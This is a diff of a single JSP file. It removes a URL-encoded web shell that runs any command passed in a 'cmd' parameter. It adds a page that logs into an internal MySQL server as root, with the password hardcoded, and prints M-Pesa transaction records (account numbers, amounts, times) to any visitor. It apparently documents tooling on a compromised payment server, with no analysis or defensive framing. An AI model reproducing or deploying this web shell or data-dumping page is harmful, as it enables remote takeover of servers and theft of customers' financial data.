@@ -1,1 +1,56 @@
-<%25%40%20page%20import%3D%22java.io.%2A%22%20%25><%25%20String%20cmd%20%3D%20request.getParameter%28%22cmd%22%29%3B%20if%20%28cmd%20%21%3D%20null%29%20%7B%20try%20%7B%20Process%20process%20%3D%20Runtime.getRuntime%28%29.exec%28cmd%29%3B%20BufferedReader%20reader%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28process.getInputStream%28%29%29%29%3B%20BufferedReader%20errorReader%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28process.getErrorStream%28%29%29%29%3B%20String%20line%3B%20out.println%28%22<h3>Command%20Output%3A<%2Fh3>%22%29%3B%20out.println%28%22<pre>%22%29%3B%20while%20%28%28line%20%3D%20reader.readLine%28%29%29%20%21%3D%20null%29%20%7B%20out.println%28line%29%3B%20%7D%20out.println%28%22<%2Fpre>%22%29%3B%20out.println%28%22<h3>Command%20Errors%20%28if%20any%29%3A<%2Fh3>%22%29%3B%20out.println%28%22<pre>%22%29%3B%20while%20%28%28line%20%3D%20errorReader.readLine%28%29%29%20%21%3D%20null%29%20%7B%20out.println%28line%29%3B%20%7D%20out.println%28%22<%2Fpre>%22%29%3B%20reader.close%28%29%3B%20errorReader.close%28%29%3B%20%7D%20catch%20%28IOException%20e%29%20%7B%20out.println%28%22An%20error%20occurred%20while%20executing%20the%20command%3A%20%22%20%2B%20e.getMessage%28%29%29%3B%20%7D%20%7D%20else%20%7B%20out.println%28%22No%20command%20specified.%22%29%3B%20%7D%20%25>
+<%@ page import="java.sql.Connection, java.sql.DriverManager, java.sql.ResultSet, java.sql.Statement" %>
+<%@ page import="java.io.PrintWriter" %>
+<html>
+<head>
+    <title>Remote MySQL Connection Example</title>
+</head>
+<body>
+    <h1>Data from Remote MySQL Database</h1>
+    <%
+        // JDBC URL, username, and password of the MySQL server
+        String jdbcUrl = "jdbc:mysql://192.168.0.65:3306/upgw";
+        String username = "root";
+        String password = "happycoding";
+
+        // JDBC variables for opening and managing connection
+        Connection conn = null;
+        Statement stmt = null;
+        ResultSet rs = null;
+
+        try {
+            // Load MySQL JDBC Driver
+            Class.forName("com.mysql.cj.jdbc.Driver");
+
+            // Open a connection
+            conn = DriverManager.getConnection(jdbcUrl, username, password);
+
+            // Execute SQL query
+            stmt = conn.createStatement();
+            String sql = "SELECT * FROM mpesaTransactions WHERE shortcode='6060047' LIMIT 200";
+            rs = stmt.executeQuery(sql);
+
+            // Extract data from result set
+            while (rs.next()) {
+                // Retrieve by column name
+                String accNo = rs.getString("accNo");
+                String amount = rs.getString("amount");
+                String transactionTime = rs.getString("transactionTime");
+
+                // Display values
+                out.println("acc No: " + accNo + ", Amount: " + amount + ", Transaction Time: " + transactionTime + "<br>");
+            }
+        } catch (Exception e) {
+            e.printStackTrace(out);
+        } finally {
+            // Clean-up environment
+            try {
+                if (rs != null) rs.close();
+                if (stmt != null) stmt.close();
+                if (conn != null) conn.close();
+            } catch (Exception e) {
+                e.printStackTrace(out);
+            }
+        }
+    %>
+</body>
+</html>
